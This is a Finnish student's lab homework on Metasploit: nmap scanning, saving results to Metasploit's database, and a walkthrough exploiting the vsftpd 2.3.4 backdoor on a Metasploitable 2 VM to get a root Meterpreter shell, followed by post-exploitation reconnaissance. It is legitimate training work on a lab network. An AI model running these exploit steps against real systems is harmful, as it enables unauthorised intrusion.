# h3-EternalHomework

## x) Lue ja Tiivistä

### Jaswal 2020: Mastering Metasploit

- Metasploit sisältää exploit-, payload-, auxiliary- ja Meterpreter-toimintoja, joita voidaan käyttää penetraatiotestauksen eri vaiheissa.
- Metasploitin etuja ovat avoin lähdekoodi, suurten verkkojen tehokas testaaminen sekä mahdollisuus tallentaa löydetyt järjestelmät, palvelut ja haavoittuvuudet tietokantaan.
- Esimerkkitestissä kohdetta tutkitaan ensin Nmapilla, jonka jälkeen tunnistetaan palveluita ja mahdollisia haavoittuvuuksia ja varmistetaan niitä metasploitin moduuleilla.
- Haavoittuvuuden hyödyntämisen jälkeen luvussa esitellään post-exploitation-vaihettam kuten verkon ja Active Directory -ympäristön tutkimista sekä pivotointia muihin järjestelmiin.
- Luvun pääidea on näyttää penetraatiotestin eteneminen tiedustelusta haavoittuvuuksien löytämiseen, hyödyntämiseen ja jatkotoimiin Metasploitin avulla.

### Mitä nmap -sn tekee?

- nmap -sn suorittaa host discovery -tarkistuksen eli etsii, mitkä kohdeverkon laitteet ovat aktiivisia.
- Se ei tee porttiskannausta löytyneille koneille.
- Oletuksena Nmap käyttää hostien tunnistamiseen useita probeja, kuten ICMP- ja TCP-paketteja.
- Paikallisessa Ethernet-verkossa käytetään yleensä ARP-kyselyitä.
-  -sn-skannausta kutsutaan usein ping scaniksi tai ping sweepiksi, ja sitä voidaan käyttää esimerkiksi aktiivisten koneiden määrän selvittämiseen

Lähde: [Nmap Reference Guide - Host Discovery](https://nmap.org/book/man-host-discovery.html)
Nmapin dokumentaatio on luotettava lähde, koska se on Nmap-projektin virallinen dokumentaatio osoitteessa nmap.org ja kuvaa suoraan ohjelman omien komentojen toimintaa.

## b) Tallenna porttiskannauksen tuloksia Metasploitin tietokantoihin

### Tietokannan alustus

Alustin ja käynnistin Metasploitin tietokannan:

```bash
sudo systemctl start postgresql
sudo msfdb init
```

Käynnistin Metasploitin ja tarkistin yhteyden:
```bash
msfconsole
db_status
```

### Tein erillisen Workspacen

```bash
workspace -a testi
workspace testi
```

<img width="405" height="161" alt="image" src="https://github.com/user-attachments/assets/e6b0ce65-4bfb-4192-ac89-e0c5cca9e2e1" />

### Skannaus

Suoritin skannauksen siten, että versioskannaus on mukana

```bash
db_nmap -sV 192.168.56.102
```

<img width="932" height="614" alt="image" src="https://github.com/user-attachments/assets/3e419ba1-815f-4ce4-b693-4b0652bcee0d" />

## c) Tallennettujen tuloksien tarkastelu


Hostit: Komento näyttää Metasploitin tietokantaan tallentuneet kohteet. Jokaisesta hostista näkyy mm. IP-osoite, MAC-osoite, käyttöjärjestelmä ja tarkoitus esim. server

<img width="749" height="119" alt="image" src="https://github.com/user-attachments/assets/6d91713c-ce18-4790-a2ed-e928737d9139" />

Palvelut: Komento näyttää kaikki tietokantaan tallentuneet palvelut ja niiden portit

<img width="910" height="478" alt="image" src="https://github.com/user-attachments/assets/86627335-e912-4d8f-94d5-6fc743bf4d9c" />

Tutkin komentoja ja kokeilin:

<img width="935" height="466" alt="image" src="https://github.com/user-attachments/assets/9e130141-5d59-42f7-a14d-681046c17fb1" />

<img width="928" height="771" alt="image" src="https://github.com/user-attachments/assets/5a0982b5-c857-4ab9-aae1-8d5c0845559a" />

## d) Internet Famous

Etsin ja muistelin tunnilla läpi käytyä haavoittuvuutta vsftpd

```bash
search vsftpd
```

<img width="935" height="225" alt="image" src="https://github.com/user-attachments/assets/3168ab6f-7d45-43f1-af93-32e4eeb38558" />

**Miksi tämä on "Internet famous"**
- Vuonna 2011 vsftpd 2.3.4 -versioon lisättiin tahallinen backdoor.
- Backdoor aktivoituu, kun käyttäjnimi sisältää ":)", jolloin palvelin avaa shellin porttiin 6200.
- Tapaus sai paljon julkisuutta, koska vsftpd oli laajasti käytetty FTP-palvelin.
- Haavoittuvuus oli mukana virallisessa lähdekoodijakelussa, mikä teki siitä erityisen vakavan ja näkyvän.

*Metasploitable 2 sisältää juuri tämän haavoittuvan version, joka näkyy skannauksessa portissa 21/tcp*

<img width="507" height="119" alt="image" src="https://github.com/user-attachments/assets/64d20d2b-b51e-434c-b678-280a68ff9201" />


## e) vertaile nmap:n omaa tiedostoon tallennusta

### Nmapin oma tallennus (-oA)

```bash
nmap -sV -oA foo 192.168.56.102
```

Tämä tuotti kolme tiedostoa
- foo.nmap - normaali tekstimuotoinen tuloste
- foo.gnmap - grep-ystävällinen muoto
- foo.xml - XML-muoto automaatiota varten

Tarkistin että tiedostot tallentui ja katsoin tekstimuotosen sisään:

```bash
cat foo.nmap
```

<img width="941" height="690" alt="image" src="https://github.com/user-attachments/assets/84db5743-02ca-4f50-a175-d45ebc17f80f" />

Tämän jälkeen msfconsolessa

```bash
db_nmap -sV 192.168.56.102
```

Tästä komennosta tiedot tallentuvat 

```bash
hosts
services
```

<img width="910" height="625" alt="image" src="https://github.com/user-attachments/assets/e95ccfc9-2ed0-4398-b088-9b2d90084c4d" />

### Lyhyt vertailu

**Nmap -oA**
- Tallentaa kolme erilaista tiedostoa levylle
- Hyvä automaatioon, siirtämiseen ja myöhempään analyysiin
- Ei vaadi Metasploitia

**db_nmap**
- Tallentaa tulokset suoraan Metasploitin tietokantaan
- Tuloksia voi suodattaa (services -p 21)
- Tulokset ovat heti käytettävissä exploit-moduulissa

## f) murtaudu vsftpd-palveluun

Oppitunnilla kävimme läpi tätä samaista tehtävää, muistin aika hyvin ulkoa miten tämä suoritettiin:

<img width="943" height="556" alt="image" src="https://github.com/user-attachments/assets/c00baa78-cad6-4da5-ba36-682eefb0b110" />

Ensimmäisenä etsimme exploitin komennolla:
```bash
search vsftpd
```
Tuloksena löytyi: *exploit/unix/ftp/vsftpd_234_backdoor*

Latasin exploitin ja asetukset:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
set LHOST 192.168.56.101
```

Suoritin hyökkäksen komennolla: *run*

**Tulokset:**

Metasploit havaitsi haavoittuvan FTP-bannerin ja backdoor aktivoitui

```bash
FTP banner hints at vulnerable: 220 (vsFTPd 2.3.4)
Backdoor has been spawned!
Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102:35196)
```

#### Lopputulos

Hyökkäys onnistui ja sain meterprete-sessionin kohdekoneeseen.
Tämä tarkoittaa, että minulla on nyt komentoyhteys Metasploitable 2:een ja voin suorittaa komentoja etänä.

## g) Kerää tietoa metasploitablesta. Analysoi ja selitä miten niitä voisi hyödyntää

Aloitin keräämällä järjestelmätietoja 

<img width="420" height="125" alt="image" src="https://github.com/user-attachments/assets/a72131e1-42de-4429-8bd4-508818be8fad" />

Käytin myös meterpreterissä komentoa: *help*, jotta sain erilaisia komentoja mitä voin käyttää

Komennolla: *getuid* 

<img width="189" height="38" alt="image" src="https://github.com/user-attachments/assets/4e42b7d4-74be-456c-a3de-cdc8fa2e3e25" />

Pääsin näkemään, että istunto oli root-tasolla ja se mahdollistaa tiedostojen lukemisen ja vaikka verkon konfiguraation tarkastelun.

**Verkkotiedot**

<img width="387" height="392" alt="image" src="https://github.com/user-attachments/assets/9eb1eb35-d878-4997-929b-f9177e9e1f55" />

Tulosteessa komennolla: *ifconfig* pääsemme näkemään IP-osoitteet(ipv4,ipv6), MAC-osoitteet tms.

### Analyysi ja hyödyntäminen

Kerätyt tiedot ovat hyödyllisiä jatkohyökkäyksissä:

- Root‑taso antaa täyden hallinnan järjestelmään — hyökkääjä voi asentaa ohjelmia, muuttaa asetuksia tai luoda uusia käyttäjiä.
- Verkkotiedot paljastavat kohdekoneen IP‑osoitteen ja verkon rakenteen, mikä auttaa laajentamaan hyökkäystä muihin koneisiin samassa verkossa.
- Järjestelmätiedot (OS, arkkitehtuuri) auttavat valitsemaan oikeat exploitit ja payloadit myöhempää käyttöä varten.

Yhteenvetona: nämä komennot (sysinfo, getuid, ifconfig) muodostavat perustan post‑exploitation‑vaiheelle, jossa hyökkääjä kartoittaa kohteen ja valmistautuu jatkotoimiin.
